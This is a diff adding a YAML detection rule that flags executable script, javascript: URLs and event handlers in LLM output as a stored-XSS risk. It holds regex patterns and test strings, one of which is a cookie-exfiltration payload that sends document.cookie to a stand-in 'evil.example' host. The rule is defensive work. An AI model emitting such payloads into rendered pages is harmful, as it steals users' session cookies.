@@ -1,0 +1,27 @@
+id: AITDP-OUT-001
+title: Executable script or event handler in model output
+category: insecure_output
+severity: high
+confidence: 0.8
+stages: [model_output, tool_output, retrieved_content]
+description: >
+  Script tags, javascript: URLs, or inline event handlers in output that may be
+  rendered as HTML downstream (stored XSS via LLM).
+references:
+  owasp_llm: [LLM05]
+  cwe: [CWE-79]
+recommended_action: sanitize
+patterns:
+  - regex: '(?i)<script[\s>]|</script>'
+  - regex: '(?i)\bjavascript\s*:'
+  - regex: '(?i)<[a-z]+[^>]*\son(load|error|click|mouseover|focus|submit)\s*='
+  - regex: '(?i)<iframe[\s>]|<object[\s>]|<embed[\s>]'
+tests:
+  match:
+    - "<script>fetch('https://evil.example?c='+document.cookie)</script>"
+    - '<img src=x onerror="alert(1)">'
+    - '<a href="javascript:alert(1)">click</a>'
+  no_match:
+    - "Use a <div> to wrap the content."
+    - "The script ran successfully."
+tags: [insecure-output, xss]
